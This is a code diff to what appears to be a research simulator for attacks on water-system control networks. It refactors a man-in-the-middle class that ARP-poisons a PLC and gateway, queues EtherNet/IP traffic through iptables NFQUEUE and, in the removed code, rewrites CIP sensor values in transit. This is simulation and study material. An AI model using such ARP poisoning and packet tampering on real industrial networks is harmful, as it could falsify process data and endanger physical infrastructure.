@@ -1,18 +1,22 @@
 import argparse
 import os
 import time
-import traceback
 from pathlib import Path
-import threading
 
-import fnfqueue
-from scapy.layers.inet import IP, TCP
-from scapy.packet import Raw
-
-from dhalsim.network_attacks.utilities import launch_arp_poison, restore_arp, \
-    translate_payload_to_float, translate_float_to_payload
+from dhalsim.network_attacks.utilities import launch_arp_poison, restore_arp
 from dhalsim.network_attacks.synced_attack import SyncedAttack
 
+import subprocess
+import sys
+import signal
+
+
+class Error(Exception):
+    """Base class for exceptions in this module."""
+
+
+class DirectionError(Error):
+    """Raised when the optional parameter direction does not have source or destination as value"""
 
 class PacketAttack(SyncedAttack):
     """
@@ -35,10 +39,9 @@ class PacketAttack(SyncedAttack):
     def __init__(self, intermediate_yaml_path: Path, yaml_index: int):
         super().__init__(intermediate_yaml_path, yaml_index)
         os.system('sysctl net.ipv4.ip_forward=1')
-        self.queue = None
-        self.q = None
-        self.thread = None
-        self.run_thread = False
+
+        # Process object to handle nfqueue
+        self.nfqueue_process = None
 
     def setup(self):
         """
@@ -53,8 +56,16 @@ class PacketAttack(SyncedAttack):
 
         Finally, it launches the thread that will examine all captured packets.
         """
-        os.system(
-            f'iptables -t mangle -A FORWARD -p tcp --sport 44818 -d {self.target_plc_ip} -j NFQUEUE --queue-num 1')
+        if self.direction == 'source':
+            os.system(f'iptables -t mangle -A PREROUTING -p tcp --sport 44818 -s {self.target_plc_ip} -j NFQUEUE '
+                      f'--queue-num 1')
+        elif self.direction == 'destination':
+            os.system(f'iptables -t mangle -A PREROUTING -p tcp --sport 44818 -d {self.target_plc_ip} -j NFQUEUE '
+                      f'--queue-num 1 ')
+        else:
+            self.logger.error('Wrong direction configured, direction must be source or destination')
+            raise DirectionError('Wrong direction configured')
+
         os.system('iptables -A FORWARD -p icmp -j DROP')
         os.system('iptables -A INPUT -p icmp -j DROP')
         os.system('iptables -A OUTPUT -p icmp -j DROP')
@@ -69,52 +80,11 @@ class PacketAttack(SyncedAttack):
         self.logger.debug(f"Naive MITM Attack ARP Poison between {self.target_plc_ip} and "
                           f"{self.intermediate_attack['gateway_ip']}")
 
-        try:
-            self.queue = fnfqueue.Connection()
-            self.q = self.queue.bind(1)
-            self.q.set_mode(fnfqueue.MAX_PAYLOAD, fnfqueue.COPY_PACKET)
-        except PermissionError:
-            self.logger.error("Permission Error trying to bind to the NFQUEUE")
+        queue_number = 1
+        nfqueue_path = Path(__file__).parent.absolute() / "mitm_netfilter_queue_subprocess.py"
+        cmd = ["python3", str(nfqueue_path), str(self.intermediate_yaml_path), str(self.yaml_index), str(queue_number)]
 
-        self.run_thread = True
-        self.thread = threading.Thread(target=self.packet_thread_function)
-        self.thread.start()
-
-    def packet_thread_function(self):
-        """
-        This function is the function that will run in the thread started in the setup function.
-
-        For every packet that enters the netfilterqueue, it will check its length. If the length is
-        in between 100 and 116, we are dealing with a CIP packet. We then change the payload of that
-        packet and delete the original checksum.
-        """
-        while self.run_thread:
-            try:
-                for packet in self.queue:
-                    p = IP(packet.payload)
-                    # Packets with 100 <= length < 116 are CIP response packets
-                    if 100 <= p[IP].len < 116:
-                        if 'value' in self.intermediate_attack.keys():
-                            p[Raw].load = translate_float_to_payload(
-                                self.intermediate_attack['value'], p[Raw].load)
-                        elif 'offset' in self.intermediate_attack.keys():
-                            p[Raw].load = translate_float_to_payload(
-                                translate_payload_to_float(p[Raw].load) + self.intermediate_attack[
-                                    'offset'], p[Raw].load)
-
-                        del p[TCP].chksum
-                        del p[IP].chksum
-
-                        packet.payload = bytes(p)
-                        self.logger.debug(f"Value of network packet for {p[IP].dst} overwritten.")
-
-                    packet.mangle()
-
-            except fnfqueue.BufferOverflowException:
-                print("Buffer Overflow in a MITM attack!")
-            except Exception as exc:
-                print("Exception in a MITM attack!:", exc)
-                print(traceback.format_exc())
+        self.nfqueue_process = subprocess.Popen(cmd, shell=False, stderr=sys.stderr, stdout=sys.stdout)
 
     def interrupt(self):
         """
@@ -140,20 +110,28 @@ class PacketAttack(SyncedAttack):
         self.logger.debug(f"Naive MITM Attack ARP Restore between {self.target_plc_ip} and "
                           f"{self.intermediate_attack['gateway_ip']}")
 
-        os.system(
-            f'iptables -t mangle -D FORWARD -p tcp --sport 44818 -d {self.target_plc_ip} -j NFQUEUE --queue-num 1')
+        if self.direction == 'source':
+            os.system(f'iptables -t mangle -D PREROUTING -p tcp --sport 44818 -s {self.target_plc_ip} -j NFQUEUE '
+                      f'--queue-num 1')
+        elif self.direction == 'destination':
+            os.system(f'iptables -t mangle -D PREROUTING -p tcp --sport 44818 -d {self.target_plc_ip} -j NFQUEUE '
+                      f'--queue-num 1 ')
         os.system('iptables -D FORWARD -p icmp -j DROP')
         os.system('iptables -D INPUT -p icmp -j DROP')
         os.system('iptables -D OUTPUT -p icmp -j DROP')
 
-        self.run_thread = False
-        self.q.unbind()
-        time.sleep(0.5)
-        self.queue.close()
-        self.thread.join()
+        self.logger.debug(f"Restored ARP")
+
+        self.logger.debug("Stopping nfqueue subprocess...")
+        self.nfqueue_process.send_signal(signal.SIGINT)
+        self.nfqueue_process.wait()
+        if self.nfqueue_process.poll() is None:
+            self.nfqueue_process.terminate()
+        if self.nfqueue_process.poll() is None:
+            self.nfqueue_process.kill()
 
     def attack_step(self):
-        """This function just passes, as there is no required action in an attack step."""
+        """Polls the NetFilterQueue subprocess and sends a signal to stop it when teardown is called"""
         pass
 
 
